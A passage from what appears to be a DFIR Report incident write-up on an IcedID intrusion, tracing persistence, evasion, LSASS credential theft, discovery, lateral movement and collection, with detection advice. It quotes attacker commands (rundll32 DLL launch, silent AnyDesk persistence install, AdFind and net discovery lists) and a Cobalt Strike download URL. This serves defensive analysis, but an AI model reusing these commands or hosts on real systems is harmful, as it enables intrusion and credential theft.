    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;"C:\Users\[REDACTED]\AppData\Roaming\[REDACTED]\Cadiak.dll",init --od="DeskBlouse\license.dat"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service:</p>
<pre>C:\ProgramData\AnyDesk.exe --install C:\ProgramData\Any --start-with-win --silent</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During the deployment of AnyDesk, a service creation event was generated under the System channel:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30562" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-010.png" alt="" width="1244" height="822" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-010.png 1244w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-010-300x198.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-010-1024x677.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-010-768x507.png 768w" sizes="(max-width: 1244px) 100vw, 1244px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for <a href="https://gist.github.com/brokensound77/6d8a1e480e65ff20e151099c98267b14" target="_blank" rel="noreferrer noopener">detecting RMM tools through resilient patterns</a> of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Masquerading</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of <a href="https://attack.mitre.org/techniques/T1036/008/" target="_blank" rel="noreferrer noopener">Masquerading, MITRE Technique T1036.008</a>, and represents an excellent opportunity for a <a href="https://github.com/joesecurity/sigma-rules/blob/master/rules/executedllwithspoofedextension.yml" target="_blank" rel="noreferrer noopener">custom detection</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor was observed using common Windows process names for other tooling used during the intrusion, including:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>csrss.exe</code> for a Cobalt Strike beacon downloaded from <code>91.215.85[.]183/download/csrss.exe</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>svchost.exe</code> for the ransomware payload deployed to systems.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Process Injection</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Upon execution of a Cobalt Strike beacon, process injection into a <code>svchost.exe</code> process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30563" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-011.png" alt="" width="3771" height="428" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-011.png 3771w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-011-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-011-1024x116.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-011-768x87.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-011-1536x174.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-011-2048x232.png 2048w" sizes="(max-width: 3771px) 100vw, 3771px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>svchost.exe</code> was subsequently observed executing multiple different commands related to discovery and enumeration.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30564" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-012.png" alt="" width="2544" height="1422" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-012.png 2544w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-012-300x168.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-012-1024x572.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-012-768x429.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-012-1536x859.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-012-2048x1145.png 2048w" sizes="(max-width: 2544px) 100vw, 2544px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Since the discovery commands involved executing scripts via <code>cmd.exe</code>, the anomalous parent child relationship between <code>svchost.exe</code> and <code>cmd.exe</code> was observed on the system from a memory dump.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30565" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-013.png" alt="" width="2513" height="964" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-013.png 2513w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-013-300x115.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-013-1024x393.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-013-768x295.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-013-1536x589.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-013-2048x786.png 2048w" sizes="(max-width: 2513px) 100vw, 2513px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Indicator Removal</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30566" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-014.png" alt="" width="3702" height="227" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-014.png 3702w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-014-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-014-1024x63.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-014-768x47.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-014-1536x94.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-014-2048x126.png 2048w" sizes="(max-width: 3702px) 100vw, 3702px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with &#8220;\postex_&#8221; which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response:</p>
<pre>Process accessed:
SourceImage: C:\Windows\system32\rundll32.exe
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d1e4|C:\Windows\System32\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D)
TargetUser: NT AUTHORITY\SYSTEM
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Event ID 8 had the following relevant fields:</p>
<pre>CreateRemoteThread detected:
SourceImage: C:\Windows\System32\rundll32.exe
TargetImage: C:\Windows\System32\lsass.exe
StartModule: -
StartFunction: -
TargetUser: NT AUTHORITY\SYSTEM
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30567" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-015.png" alt="" width="1553" height="114" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-015.png 1553w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-015-300x22.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-015-1024x75.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-015-768x56.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-015-1536x113.png 1536w" sizes="(max-width: 1553px) 100vw, 1553px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>IcedID Discovery</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>IcedID was observed executing multiple discovery commands originating from <code>rundll32.exe</code> on the beachhead.</p>
<pre>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from <a href="https://www.binarydefense.com/resources/blog/icedid-gziploader-analysis/" target="_blank" rel="noreferrer noopener">Binary Defense describes the same commands observed</a>, and a report from <a href="https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39" target="_blank" rel="noreferrer noopener">Walmart Global Tech details the algorithm to decrypt</a> the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Active Directory Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>An <code>AD.bat</code> batch script and <code>AdFind.exe</code> were dropped onto the beachhead host from a process injected <code>svchost.exe</code> process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30568" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-016.png" alt="" width="3782" height="350" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-016.png 3782w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-016-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-016-1024x95.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-016-768x71.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-016-1536x142.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-016-2048x190.png 2048w" sizes="(max-width: 3782px) 100vw, 3782px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The <code>AD.bat</code> script was subsequently executed, which initiated discovery of Active Directory via ADFind.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30569" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-017.png" alt="" width="3247" height="1011" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-017.png 3247w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-017-300x93.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-017-1024x319.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-017-768x239.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-017-1536x478.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-017-2048x638.png 2048w" sizes="(max-width: 3247px) 100vw, 3247px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<pre>adfind.exe  -gcb -sc trustdmp 
adfind.exe  -f "(objectcategory=group)" 
adfind.exe  -subnets -f (objectCategory=subnet)
adfind.exe  -f (objectcategory=organizationalUnit) 
adfind.exe  -f objectcategory=computer -csv name operatingSystem 
adfind.exe  -f objectcategory=computer 
adfind.exe  -f (objectcategory=person) 
C:\Windows\system32\cmd.exe /c dir /s /b C:\Windows\system32\*htable.xsl
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Nslookup Discovery</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>An injected process <code>svchost.exe</code> was observed dropping a <code>ns.bat</code> Batch script.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30572" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-018.png" alt="" width="3785" height="211" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-018.png 3785w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-018-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-018-1024x57.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-018-768x43.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-018-1536x86.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-018-2048x114.png 2048w" sizes="(max-width: 3785px) 100vw, 3785px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Execution of <code>ns.bat</code> initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30573" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-019.png" alt="" width="3093" height="1234" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-019.png 3093w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-019-300x120.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-019-1024x409.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-019-768x306.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-019-1536x613.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-019-2048x817.png 2048w" sizes="(max-width: 3093px) 100vw, 3093px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Later, a second <code>nsser.bat</code> script was observed executing multiple nslookup commands.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30574" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-020.png" alt="" width="3704" height="1327" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-020.png 3704w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-020-300x107.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-020-1024x367.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-020-768x275.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-020-1536x550.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-020-2048x734.png 2048w" sizes="(max-width: 3704px) 100vw, 3704px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Port Scanning</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30575" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-021.png" alt="" width="3582" height="393" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-021.png 3582w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-021-300x33.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-021-1024x112.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-021-768x84.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-021-1536x169.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-021-2048x225.png 2048w" sizes="(max-width: 3582px) 100vw, 3582px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>NetScan was seen connecting to multiple ports, on multiple different IP addresses&#8211;an activity indicative of port scanning.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30576" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-022.png" alt="" width="3750" height="1321" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-022.png 3750w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-022-300x106.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-022-1024x361.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-022-768x271.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-022-1536x541.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-022-2048x721.png 2048w" sizes="(max-width: 3750px) 100vw, 3750px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The following summarizes a list of ports that were scanned using NetScan.</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>Port</strong></td>
<td><strong>Purpose</strong></td>
</tr>
<tr>
<td>53</td>
<td>DNS</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
</tr>
<tr>
<td>88</td>
<td>Kerberos</td>
</tr>
<tr>
<td>111</td>
<td>NFS, NIS, or any rpc-based service</td>
</tr>
<tr>
<td>135</td>
<td>Remote Procedure Call</td>
</tr>
<tr>
<td>137</td>
<td>NetBIOS</td>
</tr>
<tr>
<td>161</td>
<td>SNMP</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS</td>
</tr>
<tr>
<td>445</td>
<td>SMB</td>
</tr>
<tr>
<td>464</td>
<td>Used by the Kerberos authentication system</td>
</tr>
<tr>
<td>2049</td>
<td>NFS</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
</tr>
<tr>
<td>5353</td>
<td>Multicast DNS (mDNS) and DNS-SD</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>Hands on Discovery</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as <a href="https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/" target="_blank" rel="noreferrer noopener">indicated </a>by the <code>/7</code> flag.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30577" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-023.png" alt="" width="3714" height="343" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-023.png 3714w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-023-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-023-1024x95.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-023-768x71.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-023-1536x142.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-023-2048x189.png 2048w" sizes="(max-width: 3714px) 100vw, 3714px" /></a></p>
<p>Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included:</p>
<pre><span class="unifiedDataTable__inner"><span class="unifiedDataTable__cellValue">C:\Windows\system32\cmd.exe /C net group "domain Admins" /domain<br />route print<br />whoami</span></span></pre>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30743" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1.png" alt="" width="3574" height="720" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1.png 3574w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1-300x60.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1-1024x206.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1-768x155.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1-1536x309.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-024-1-2048x413.png 2048w" sizes="(max-width: 3574px) 100vw, 3574px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Cobalt Strike payload was downloaded from <code>91.215.85[.]183/download/csrss.exe</code> via Internet Explorer.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30579" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-025.png" alt="" width="3072" height="390" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-025.png 3072w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-025-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-025-1024x130.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-025-768x98.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-025-1536x195.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-025-2048x260.png 2048w" sizes="(max-width: 3072px) 100vw, 3072px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30580" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-026.png" alt="" width="1305" height="299" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-026.png 1305w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-026-300x69.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-026-1024x235.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-026-768x176.png 768w" sizes="(max-width: 1305px) 100vw, 1305px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30581" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-027.png" alt="" width="3732" height="295" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-027.png 3732w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-027-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-027-1024x81.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-027-768x61.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-027-1536x121.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-027-2048x162.png 2048w" sizes="(max-width: 3732px) 100vw, 3732px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>In addition, the <code>INSTALL.ps1</code> script was dropped and executed by the Cobalt Strike beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30582" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-028.png" alt="" width="3618" height="635" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-028.png 3618w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-028-300x53.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-028-1024x180.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-028-768x135.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-028-1536x270.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-028-2048x359.png 2048w" sizes="(max-width: 3618px) 100vw, 3618px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use <code>notepad++</code> to open a file related to the insurance policy of this victim.</p>
